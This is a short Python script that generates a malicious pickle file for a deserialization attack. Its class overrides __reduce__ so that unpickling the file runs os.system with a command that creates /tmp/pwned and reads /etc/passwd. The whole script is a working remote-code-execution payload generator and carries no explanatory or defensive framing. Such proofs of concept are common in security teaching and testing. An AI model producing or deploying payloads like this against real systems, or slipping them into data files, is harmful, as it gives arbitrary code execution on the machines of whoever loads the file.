import os
import pickle


class RCE:
    def __reduce__(self):
        cmd = "touch /tmp/pwned && cat /etc/passwd"
        return os.system, (cmd,)


if __name__ == "__main__":
    pickled = pickle.dumps(RCE())
    with open("malicious.pickle", "wb") as f:
        f.write(pickled)
